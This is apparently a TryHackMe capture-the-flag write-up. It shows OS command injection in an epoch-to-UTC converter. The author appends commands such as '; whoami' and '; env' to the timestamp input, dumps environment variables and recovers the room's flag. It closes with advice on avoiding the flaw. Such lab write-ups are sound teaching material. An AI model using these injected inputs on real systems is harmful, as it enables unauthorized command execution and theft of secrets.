# TryHackMe — Epoch

Target: `http://10.49.139.101/`

Simple one today. The site is a little "Epoch to UTC convertor" ⏳ tool — you punch in a Unix timestamp, hit Convert, and it spits back the UTC date. Classic setup for a command injection challenge, so that's exactly where I went first.

## Poking at it

Dropped in a normal value, `125151`, just to see it work:

```
Fri Jan  2 10:45:51 UTC 1970
```

Works as expected. Now the real question — is this thing shelling out to `date -d @<input>` or something similar on the backend? Only one way to find out.

## Command injection

Tried chaining a command with a semicolon:

```
125151; whoami
```

And got:

```
Fri Jan  2 10:45:51 UTC 1970
challenge
```

Anddd there it is. The converter is literally passing our input straight into a shell command, no sanitization at all. `whoami` came back as `challenge`, confirming we've got command injection on the backend.

## Grabbing the flag

Since we can run arbitrary commands, might as well dump the environment and see what's sitting there:

```
125151; env
```

Response:

```
Fri Jan  2 10:45:51 UTC 1970
HOSTNAME=e7c1352e71ec
PWD=/home/challenge
HOME=/home/challenge
GOLANG_VERSION=1.15.7
FLAG=flag{7da6c7debd40bd611560c13d8149b647}
SHLVL=1
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
```

And there's the flag sitting right in the environment variables.

**FLAG: `flag{7da6c7debd40bd611560c13d8149b647}`**

## Takeaway

Textbook OS command injection — the backend (looks like a Go app, given `GOLANG_VERSION` in the env) was almost certainly shelling out to the system's `date` binary to do the epoch conversion instead of using a proper library call, and passing user input straight in unescaped. Moral of the story: never build shell commands out of raw user input, always use language-native parsing/date libraries instead of forking out to `date -d`.

Thanks for reading!
